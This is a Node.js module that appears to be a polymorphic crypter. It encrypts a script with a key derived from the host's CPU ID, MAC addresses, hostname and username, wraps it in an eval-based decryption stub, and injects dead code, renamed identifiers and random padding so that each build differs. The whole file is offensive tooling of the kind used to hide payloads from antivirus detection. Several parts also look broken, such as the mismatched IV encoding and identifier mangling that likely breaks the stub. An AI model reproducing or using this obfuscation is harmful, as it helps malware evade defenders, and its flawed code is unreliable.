const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ─── ENTROPY SOURCE ───────────────────────────────────────────────────────────
function getSystemEntropy() {
  const parts = [];
  try {
    // CPU serial
    if (process.platform === 'win32') {
      const { execSync } = require('child_process');
      try {
        parts.push(execSync('wmic cpu get processorid /format:csv', { encoding: 'utf8' }).trim());
      } catch (_) { }
    }
    // MAC address
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
      for (const addr of iface) {
        if (addr.mac) parts.push(addr.mac);
      }
    }
    // Hostname + username
    parts.push(os.hostname(), os.userInfo().username);
    // Timestamp + random
    parts.push(Date.now().toString(), crypto.randomBytes(16).toString('hex'));
  } catch (_) { }
  const entropy = parts.join('');
  return crypto.createHash('sha256').update(entropy).digest();
}

// ─── BLOCK ENCRYPTION ─────────────────────────────────────────────────────────
function encryptBlock(data, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(data, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return Buffer.from(iv + ':' + encrypted);
}

function decryptBlock(block, key) {
  try {
    const parts = block.toString().split(':');
    const iv = Buffer.from(parts[0], 'base64');
    const encrypted = parts.slice(1).join(':');
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encrypted, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (_) { return null; }
}

// ─── MUTATION ─────────────────────────────────────────────────────────────────
function mutateString(str, key) {
  let result = '';
  for (let i = 0; i < str.length; i++) {
    const charCode = str.charCodeAt(i);
    const shift = key[i % key.length] % 32;
    result += String.fromCharCode(charCode + shift);
  }
  return result;
}

function mutateVariables(code, key) {
  const vars = code.match(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g) || [];
  const uniqueVars = [...new Set(vars)];
  let mutated = code;
  for (const v of uniqueVars) {
    if (v.length > 2 && !v.startsWith('//') && !v.startsWith('*')) {
      const newName = mutateString(v, key);
      mutated = mutated.split(v).join(newName);
    }
  }
  return mutated;
}

// ─── DEAD CODE INJECTION ──────────────────────────────────────────────────────
function injectDeadCode(code, key) {
  const deadFunctions = [
    `function ${mutateString('_dead_func_a', key)}() { return ${Math.random() * 10000}; }`,
    `function ${mutateString('_dead_func_b', key)}() { const x = ${Math.random() * 1000}; return x * 2; }`,
    `var ${mutateString('_dead_var_1', key)} = ${Math.random().toString(16).slice(2)};`,
    `var ${mutateString('_dead_var_2', key)} = [${Math.random()}, ${Math.random()}, ${Math.random()}];`,
  ];
  const injectionPoints = [
    code.length * 0.25,
    code.length * 0.5,
    code.length * 0.75
  ];
  let result = code;
  for (const point of injectionPoints) {
    const idx = Math.floor(point);
    const func = deadFunctions[Math.floor(Math.random() * deadFunctions.length)];
    result = result.slice(0, idx) + '\n' + func + '\n' + result.slice(idx);
  }
  return result;
}

// ─── BUILD GENERATION ─────────────────────────────────────────────────────────
function generateUniqueBuild(sourceCode, targetOS = null) {
  const entropy = getSystemEntropy();
  const key = entropy;
  
  // Encrypt payload
  const encryptedPayload = encryptBlock(sourceCode, key);
  
  // Generate stub
  const stub = `
(function() {
  var __key = Buffer.from('${key.toString('base64')}','base64');
  var __payload = Buffer.from('${encryptedPayload.toString('base64')}','base64');
  var __parts = __payload.toString().split(':');
  var __iv = Buffer.from(__parts[0],'base64');
  var __encrypted = __parts.slice(1).join(':');
  var __decipher = require('crypto').createDecipheriv('aes-256-cbc', __key, __iv);
  var __decrypted = __decipher.update(__encrypted,'base64','utf8') + __decipher.final('utf8');
  eval(__decrypted);
})();
`;
  
  // Add dead code
  const withDeadCode = injectDeadCode(stub, key);
  
  // Mutate variables
  const mutated = mutateVariables(withDeadCode, key);
  
  // Add random padding
  const padding = crypto.randomBytes(64).toString('hex');
  const finalBuild = `/* Build ID: ${crypto.randomBytes(8).toString('hex')} */\n` +
                     `/* Generated: ${new Date().toISOString()} */\n` +
                     `/* Target: ${targetOS || process.platform} */\n` +
                     mutated +
                     `\n/* Padding: ${padding} */`;
  
  return {
    code: finalBuild,
    key: key.toString('hex'),
    buildId: crypto.randomBytes(8).toString('hex'),
    timestamp: Date.now()
  };
}

// ─── POLYMORPHIC WRAPPER ──────────────────────────────────────────────────────
function polymorphicWrap(modulePath) {
  try {
    const source = fs.readFileSync(modulePath, 'utf8');
    const result = generateUniqueBuild(source);
    const outputPath = path.join(os.tmpdir(), `poly_${result.buildId}.js`);
    fs.writeFileSync(outputPath, result.code, 'utf8');
    return {
      success: true,
      outputPath,
      buildId: result.buildId,
      key: result.key
    };
  } catch (_) {
    return { success: false, error: _.message };
  }
}

// ─── EXPORTS ──────────────────────────────────────────────────────────────────
module.exports = {
  getSystemEntropy,
  encryptBlock,
  decryptBlock,
  mutateString,
  mutateVariables,
  injectDeadCode,
  generateUniqueBuild,
  polymorphicWrap
};